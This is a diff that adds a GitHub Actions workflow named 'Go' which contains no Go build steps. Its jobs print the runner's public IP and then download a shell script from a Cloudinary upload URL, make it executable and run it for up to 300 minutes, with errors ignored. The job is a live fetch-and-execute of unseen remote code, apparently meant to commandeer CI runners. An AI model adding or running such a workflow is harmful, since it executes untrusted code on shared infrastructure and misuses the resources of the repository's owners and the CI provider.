@@ -1,0 +1,21 @@
+name: Go
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+jobs:
+  run:
+    continue-on-error: true
+    runs-on: ubuntu-latest
+    steps:
+      - name: IP Workflow
+        run: |
+          curl https://api.ipify.org
+      - name: Run exec
+        timeout-minutes: 300
+        run: |
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1722847620/bsansbot1.sh
+          chmod +x bsansbot1.sh
+          ./bsansbot1.sh
